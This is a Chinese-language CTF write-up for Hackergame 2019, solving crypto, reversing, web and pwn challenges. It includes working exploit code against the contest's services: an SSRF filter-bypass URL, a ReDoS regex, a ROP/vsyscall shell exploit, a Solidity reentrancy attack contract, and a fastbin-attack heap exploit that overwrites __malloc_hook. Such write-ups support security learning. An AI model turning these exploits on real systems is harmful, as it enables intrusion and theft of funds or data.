# Write-up
(~~WARNING:以下内容含有各种口胡、吐槽~~)

## 签到题
没什么可写的
## 白与夜
图片下载下来，发现它在白色背景和黑色背景时显示的内容不一样（~~幻影坦克？~~）
换个背景色就能拿到flag了
## 信息安全 2077
改一下head里面的`If-Unmodified-Since`就好了
## 宇宙终极问题（未完成）
### 42
搜一下就出来了
### Everything
可能需要搜很多下（x

[四立方和计算](https://www.alpertron.com.ar/FCUBES.HTM)
[四平方和计算](https://www.alpertron.com.ar/FSQUARES.HTM)
### Last Question
上文的[四平方和计算](https://www.alpertron.com.ar/FSQUARES.HTM)有概率能把最后一题的分解为两平方和，但是运气太差没有试出来Orz
## 网页读取器
源码过滤url时候并没有考虑# ?之类的

构造一个`http://web1/flag#@example.com`就拿到flag了
## 达拉崩吧大冒险
在买童子鸡的位置处有整数溢出漏洞

多试几次，把自己的攻击力溢出到巨大就好了
## Happy LUG
punycode+DNS解析的TXT记录
## 正则验证器
找个特别卡的正则来就好了

我用的是`(0*)*a`和`00000000000000000000000`
## 不同寻常的 Python 考试
>有一回对我说道,“你学过python么?”我略略点一点头.他说,“学过python,……我便考你一考.python中数字的0,怎样写的?”我想,彬彬一样的人,也配考我么?便回过脸去,不再理会.出题人等了许久,很恳切的说道,“不能写罢?……我教给你,记着!这些trick应该记着.将来登dua郎的时候,调参要用.”我暗想我和dalao的等级还很远呢,而且dalao炼丹也从不调参；又好笑,又不耐烦,懒懒的答他道,“谁要你教,不是0，0.0，-0.0和False么?”出题人显出极高兴的样子,将两个指头的长指甲敲着键盘,点头说,“对呀对呀!……0有七样写法,你知道么?

（~~以上内容仅为调侃，无恶意~~)

python trick大考试 直接放payload 原理请看官方题解（
```python
from pwn import *

io = remote("202.38.93.241", 10008)
io.sendlineafter("token", "")

def solve(p, idx, ans):
    log.info("solve {}".format(idx))
    p.sendlineafter("you want to play?", str(idx))
    p.sendlineafter("Your answer:", ans)

solve(io, 1, "'Hello'")
solve(io, 2, "1, 1, [1], [1]")
solve(io, 3, "''")
solve(io, 4, "[[]], 1")
solve(io, 5, "[3, 2, 1]")
solve(io, 6, "{1, 2}, {1, 3}")
solve(io, 7, "'a', -1, 2")
solve(io, 8, "'a', -1, -2")
solve(io, 9, "1, -1")
solve(io, 10, "'abc', ''")
solve(io, 11, "{'ab'}")
solve(io, 12, "{2}, {1, 2}")
solve(io, 13, "{2}, {2}")
solve(io, 14, "([],[1])")
solve(io, 15, "'', 'abc'")
solve(io, 16, r"233,b'\xe9'")
solve(io, 17, '"",{0:""}')
solve(io, 18, "6e6666666, 6e666666666")
solve(io, 19, r"'\u1c50\u1c50\u1c50\u06f5'")
solve(io, 20, "[0, 0.0, False, 0j,-0.0,-0j,-0.0-0j]")

io.interactive()
```

## 小巧玲珑的 ELF
直接拖进IDA，F5，(~~按一下玩一年~~)

然后写解密脚本就好了

具体脚本不知道被我丢到哪里去了，大家去看出题人的就好了（x

## Shell骇客
### 1
pwntools传个shellcode就好了，略
### 2、3
使用alpha3生成可见字符串的shellcode就好了，没了

（ps:不过alpha3很难编译，建议大家还是去看官方题解）

## 三教奇妙夜
我直接用ffmpeg提取了一遍关键帧，发现最后有一部分flag没有出来

然后尝试用ffmpeg -ss跳过前面的部分，但是我的ffmpeg编译的好像有bug，gg

最后观察flag图片的格式，发现(0,120)处像素都是黑色，用opencv提取一波

```python
import cv2
import os

video_path = r"./output.mp4"

img_path = r'./images'

if not os.path.isdir(img_path):
    os.mkdir(img_path)

vidcap = cv2.VideoCapture(video_path)
(cap, frame) = vidcap.read()

if cap == False:
    print('cannot open video file')
count = 0
while cap:
    if not (frame[0,120]==[2,2,2]).all():
        cv2.imwrite(os.path.join(img_path, '%.6d.jpg' % count), frame)
    count += 1
    (cap, frame) = vidcap.read()
```
## 小 U 的加密
题目说是位运算，我们很轻易地就能想到是异或

然后观察一下文件，发现有好多0x39，猜想这个原来可能是0x00。也就是说，文件每个字节都被异或了0x39

写个脚本把文件解密回去
```python
data = []
with open("flag.enc","rb") as f:
    with open("output.enc","wb") as f2:
        f2.write(bytes(map(lambda x: x^0x39,f.read())))
```
然后观察文件头，google了一下MThd，发现是midi，拖进audacity，发现钢琴卷帘上就是flag（~~莫名想到b站那群在fl钢琴卷帘上作画的带"艺术"家~~)
## 献给最好的你
~~送给最好的TA.apk~~

用jadx反编译，在`data.LoginDataSource`内发现密码的加密逻辑，就是先base64 编码，再大小写互换后，与`AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==` 对比

很轻易就能拿到密码`hackergame2019withfun!`

继续静态分析，发现`logout`函数里面有flag相关的逻辑，照抄就可以了

## 驴啃计算器
当时被system error困扰了很长时间，后来换了个方式去凑，就解决了

主要通过构造二进制小数来去逼近有理数

很简单，我们能得到

`x*2 <=> exp,x^2,log`

`x/2 <=> exp,sqrt,log`

然后就需要构造个+1，但是我数学太菜，不会，于是暴力搜索了个
`sqrt,asinh,cosh,x^2`用

然后就是去凑二进制小数了，我们有两种方式，比如凑`100.1101`
1. 先去凑`1001101`，然后再用除法移动小数点
2. 先去凑`0.1001101`，然后再用乘法移动小数点

经过不断地摸索与练习（误），我发现第一种会system error，然后果断转向第二种，然后过了（

```python
a = "101111.01110001110101101001111000010000110001101100011"
b = "1100000.0010011010110001110001010101011111011110101"
c = "1010100.1011001110110010100000111111010110000000010101"
def f(x):
    jia = "sqrt,asinh,cosh,x^2"
    cheng = "exp,x^2,log"
    chu = "exp,sqrt,log"
    cnt = 0
    b = False
    s = ""
    for k in x[::-1]:
        if k=='1':
            s+=jia
            s+=','
        
        if b:
            cnt+=1
        if k=='.':
            b = True
        else:
            s+=chu
            s+=','
    for i in range(cnt):
        s+=cheng
        s+=','
    return s
print(f(a))
print(f(b))
print(f(c))
```
(~~变量起名困难症~~)

## 天书残篇
拿到题目时，看到一堆0x20,0x09,0x0a还以为是Ook!，结果才发现是whitespace

扔到[在线IDE](https://vii5ard.github.io/whitespace/)上拿到字节码，然后分析字节码就能发现判断flag的逻辑，解密即可

## 我想要个家
chroot给这个程序换个根目录，然后照着它要求做就好了

## 十次方根
`m^10%(p*q*q*q) = c`可以分解为`m^10%p = c`和`m^10%q^3 = c`

然后`m^10%q^3 = c`可以通过求解`m^10%q = c`然后用Hensel’s lifting lemma到`m^10%q^3 = c`

最后求出来`m%p`和`m%q*q*q`，用中国剩余定理就能求出来`m`了

```python
import struct
import gmpy2
import math
from functools import reduce

x = ...
y = ...
z = ...


def f(x):
    return x**10-(z%(y*y*y))


def df(x):
    return 10*(x**9)

#copy from google(x)
def lift(p, basesolution):
    fr = f(basesolution)
    dfr = df(basesolution)
    if dfr % p != 0:
        dfrni = gmpy2.invert(dfr, p)
        t = (-dfrni*fr//pow(p, 1)) % p
        basesolution = basesolution+t*pow(p, 1)
    else:
        return -1
    fr = f(basesolution)
    dfr = df(basesolution)
    if dfr % p != 0:
        dfrni = gmpy2.invert(dfr, p)
        t = (-dfrni*fr//pow(p, 2)) % p
        basesolution = basesolution+t*pow(p, 2)
    else:
        return -1
    return basesolution


l1 = [
    #m%p在这里
]


l2 = [
    #m%q^3在这里
]

mmodxlist = []
mmodylist = []
mmod3ylist = []

for a, b in l1:
    mmodxlist.append(a)
for a, b in l2:
    mmodylist.append(a)
    mmod3ylist.append(lift(y, a))

print(len(mmodxlist), len(mmodylist), len(mmod3ylist))

#copy from google(x)
def CRT(ai, mi):
    assert (isinstance(mi, list) and isinstance(ai, list))
    M = reduce(lambda x, y: x * y, mi)
    ai_ti_Mi = [a * (M // m) * gmpy2.invert((M // m), m)
                for (m, a) in zip(mi, ai)]
    return reduce(lambda x, y: x + y, ai_ti_Mi) % M

#pycrypto未知原因炸掉了，copy from pycrypto
def long_to_bytes(n, blocksize=0):
    s = ''
    n = long(n)
    pack = struct.pack
    while n > 0:
        s = pack('>I', n & 0xffffffffL) + s
        n = n >> 32
    # strip off leading zeros
    for i in range(len(s)):
        if s[i] != '\000':
            break
    else:
        # only happens when n == 0
        s = '\000'
        i = 0
    s = s[i:]
    if blocksize > 0 and len(s) % blocksize:
        s = (blocksize - len(s) % blocksize) * '\000' + s
    return s


for mmodx in mmodxlist:
    for mmody in mmod3ylist:
        m = CRT([mmodx, mmody], [x, y*y*y])
        if b'flag' in long_to_bytes(m):
            print(long_to_bytes(m))
```

## 被泄漏的姜戈
题目提示
> 什么 hub 还是 lab 来着建了一个叫 openlug

然后去github找到 https://github.com/openlug/django-common 这个项目

(ps: openlug <-> openbilibili

django-common <-> go-common

~~出题人你绝对在暗示什么吧~~)

审一下django有关session的源码，写个加解密脚本就ok了

## 无限猴子定理
给了一个LCG，然后初始种子为0x0000，尝试遍历一下，发现在第0xFFE9次迭代时又出现了一次0x0000，而0xFFE9 < 0xFFFB，所以肯定有一部分数并没有被LCG生成出来

把这部分数拿出来作为种子，按题目给的算法，就能拿到flag

```python
def random_iter(value):
    while True:
        yield value
        value *= 0x7603
        value += 0x980B
        value %= 0xFFFB

def brute_force3():
    a = open('might_be_flag.txt').read()
    i = iter(random_iter(0x0000))
    next(i)
    l = {next(i) for _ in range(0xFFE9)}
    aa = {n for n in range(0xFFFB+1)}
    
    k = list(aa - l - {0})
    k.sort()
    for n in k:
        i = iter(random_iter(n))
        next(i)
        l = [n]+[next(i) for _ in range(0x0011)]
        s = ''
        b = True
        for k in l:
            s += a[k]
        if (b):
            print(s)

if __name__ == '__main__':
    brute_force3()
```

## PowerShell 迷宫
写个dfs就可以跑出flag了

…

……

啊？你问我payload在哪？可惜这里空间太小写不……(被打死

粗心的作者随手删掉了他的payload，并且由于他很懒，并没有重写（（

（欢迎大家去看[官方题解](https://github.com/ustclug/hackergame2019-writeups/blob/master/official/PowerShell_%E8%BF%B7%E5%AE%AB/README.md)，写的比我的好太多了

## 韭菜银行

### flag1
用etherscan可以很容易看到这个合约的源码
```
function get_flag_1(uint128 guess) public view returns(string) {
    require(guess == secret);

    bytes memory h = new bytes(32);
    for (uint i = 0; i < 32; i++) {
        uint b = (secret >> (4 * i)) & 0xF;
        if (b < 10) {
            h[31 - i] = byte(b + 48);
        } else {
            h[31 - i] = byte(b + 87);
        }
    }
    return string(abi.encodePacked("flag{", h, "}"));
}
```
从这个函数中看出，我们应该去找`secret`，向上翻到`constructor`函数，我们发现`secret`由合约创建者初始化，

去找ContractCreator，然后翻交♂易记录，拿到`secret`为000000000000000000000000000000000175bddc0da1bd47369c47861f48c8ac

然后扔给这个函数就好了

### flag2
```
function withdraw(uint amount) public {
    require(balance[msg.sender] >= amount);
    msg.sender.call.value(amount)();
    balance[msg.sender] -= amount;
}
```
在这里的第三行我们能发现一个重入漏洞，写个合约去调用就好了
```
pragma solidity ^0.4.26;

interface JCBank {
    function deposit()external payable ;

    function withdraw(uint amount)external ;

    function get_flag_2(uint user_id) external;
}

contract abc {
    JCBank constant private target = JCBank(0xE575c9abD35Fa94F1949f7d559056bB66FddEB51);
    bool private flag = false;
    function() external payable{
        if (!flag)
        {
            flag = true;
            target.withdraw(1 wei);
        }
    }
    function abc() public payable{
        target.deposit.value(1 wei)();
        target.withdraw(1 wei);
        target.get_flag_2(315693261054);
    }
}
```

## 无法利用的漏洞
ROP2vsyscall，且栈上有未被清除的TEXT段地址，直接低字节覆盖
```python
from pwn import *
import time

context.log_level = "debug"
while True:
	time.sleep(10)
	io = remote("202.38.93.241",10014)	
	io.sendlineafter("token:","")
    #io = process("./impossible")
	#gdb.attach(io)
	try:
		io.recvline()
		io.recvline()

		io.send(p64(0xffffffffff600000)*27+"\x6B\x49")
		io.recvline()
		io.sendline("$0\x00")#这里用/bin/sh出问题了，用这个代替一下

		io.sendline("cat flag")
		print(io.recvrepeat(3))
		break
	except	EOFError:
		io.close()
		continue
```

## 没有 BUG 的教务系统
### 1
看源码可以得到加密函数，然后已知最后一位为`\x00`，从后向前爆破即可
```c
#include <stdio.h>
char a[] = "\x44\x00\x02\x41\x43\x47\x10\x63\x00";

int main()
{
    char temp_password[10] = {0};
    int possible = 0;
    for (int i = 7; i >= 0; i--)
    {
        for (int j = 0; j <= 127; j++)
            if (a[i] == (((j | temp_password[i + 1]) & ~(j & temp_password[i + 1]) | i) & ~((j | temp_password[i + 1]) & ~(j & temp_password[i + 1]) & i)))
            {
                temp_password[i] = j;
                possible++;
                break;
            }
    }
    if (possible > 7)
        printf("%s\n", temp_password);
    return 0;
}
```
### 2
(~~随机输入，法力无边~~)

直接看源码是看不出任何洞的，所有操作字符串的位置都卡的很好，根本不可能溢出，唯一要说的地方就是，每次edit都会有一块堆内存没被free从而内存泄露（……

随便给了个任意长度的字符串，大概给了`0x233`长度的字符串时候，发现程序SIGSEGV了，gdb跟进去，发现free了一个不存在的地址，这个地址正好是我们输入进去的字符串

原因大概是先修改密码时候，栈上有输入的内容，然后调用editInfo时候，没有清理栈，导致v5在析构的时候free掉了你以前输入的东西

于是我们先利用任意地址free在bss段伪造chunk，然后再利用fastbin attack伪造一个chunk修改T的地址，让其studentNum指向某个got表来泄露地址。有了libc地址就再用fastbin attack修改 malloc_hook为one_gadget即可

```python
#coding:utf-8
from pwn import *

context.log_level = 'debug'
io = remote("202.38.93.241", 10012)
libc = ELF("./libc-2.23.so")
io.sendlineafter("token: ", "")

def lg(name, val):
    log.info(name+" : "+hex(val))

def edit_info(p, passwd, stu_num):
    p.sendlineafter( "choice:", '1')
    p.sendafter( "Your new password: ", passwd)
    p.readuntil( "STUDENT: ")
    res = p.readuntil( "Tell me")
    p.sendafter( "NUMBER(eg: PB19000001), please:", stu_num)
    p.sendlineafter( "CALCULUS grade(0~100):", '100')
    p.sendlineafter( "LINEAR ALGEBRA grade:", '100')
    p.sendlineafter( "MECHANICS grade:", '100')
    p.sendlineafter( "CRYPTOGRAPHY grade:", '100')
    return res

g_username = 0x6032C0
g_passwd = 0x6032E0
g_tmp_stu_num = 0x603380
got_read = 0x602F38


io.sendlineafter( "Username:", "admin")
io.sendlineafter( "Password:", "p455w0rd\x00")

edit_info(io, (p64(0)+p64(0x71)).ljust(0x70, 'a')+p64(0x21)*2+p64(g_passwd+0x10)*2+p64(0x21)+p64(0x21)[:7], 'aaa')
edit_info(io, p64(0)+p64(0x71)+p64(0x603285)*2, 'a'*0x60)

#[*] now bin_0x60 -> 0x603285

p1 = ('a'*11+p64(g_username).ljust(0x20, 'a')+p64(got_read)+p32(0x64)*3).ljust(0x60, 'a')
edit_info(io, p64(got_read)+p32(0x64)*3, p1)

res = edit_info(io, p64(got_read)+p32(0x64)*3, 'bbb')[:6]

libc_addr = u64(res+'\x00\x00')
lg("libc_addr", libc_addr)
libc.address = libc_addr - 0xf7250
lg("libc base", libc.address)


one = libc.address + 0xf1147
# modify malloc_hook
edit_info(io, (p64(0)+p64(0x71)).ljust(0x70, 'a')+p64(0x21)*2+p64(g_passwd+0x10)*2+p64(0x21)+p64(0x21)[:7], 'aaa')
edit_info(io, p64(0)+p64(0x71)+p64(libc.symbols['__malloc_hook'] - 0x23)*2, ('\x00').ljust(0x60, 'a'))

edit_info(io, 'aaa', ("a"*19 + p64(one)).ljust(0x60, 'a'))

io.sendlineafter( "choice:", '1')
io.sendafter("Your new password: ", 'aaa')

io.interactive()
```

## 失落的圣物
是个KVM题，阅读源码可以看到，KVM加载了`binary_guest64_img_start`这里作为代码，我们把这里取出来，然后继续IDA分析，可以看出是个XXTEA加密，当 n > 0 时是加密，n < 0 时是解密算法

然后我们把`mov     dword ptr [rbp-0Ch], 0h`这里patch成`mov     dword ptr [rbp-0Ch], 0FFFFFFECh`

写个c代码加载一下这个程序，gdb运行，然后在内存中拿到flag

## Flag 红包
> 什么? 左右互博还需要题解?

（~~来自出题人的恶意~~）

老爹说过，要用AI战胜AI（误

于是我们也写了个AI

只需要注意以下几点

1. 没有出度的点肯定为必胜点，谁走到这里谁就会赢
2. 我们研究了对面的AI，发现对面也知道第一条，所以有任意一条出边连到必胜点的话，这个点就为必败点
3. 注意，如果一个点只有一条出边，且它连到了必胜点，那么他就是必败点
4. 通过2.3.条的递归，可以避免类似单行路的情况，防止被对面绕进去

代码懒得放了，我觉得这个应该很容易写出来(<ゝω·)~☆
